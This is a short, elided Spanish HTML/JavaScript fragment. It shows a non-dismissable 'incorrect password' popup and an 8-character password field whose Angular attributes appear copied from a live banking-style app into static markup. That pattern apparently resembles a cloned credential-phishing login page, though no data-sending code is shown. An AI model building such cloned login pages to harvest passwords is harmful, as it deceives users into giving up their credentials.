...
Swal.fire({
    ...
    confirmButtonText: 'Aceptar',
    allowOutsideClick: false,
    html: '<h1 style="text-align:center;margin-bottom:15px;font-size:30px;font-weight: bold;">CONTRASE&Ntilde;A INCORRECTA</h1>'
});
</script>
      ...
      <div _ngcontent-c15="" class="row justify-content-center d-block">
        <div _ngcontent-c15="" class="col-12">
          <div _ngcontent-c15="" class="form-group">
            ...
            <input _ngcontent-c15="" minlength="8" maxlength="8"  placeholder="Contrase&ntilde;a" class="form-control ng-touched ng-dirty ng-valid" formcontrolname="client" name="pass" id="user" type="password">
          </div>
        </div>
      </div>
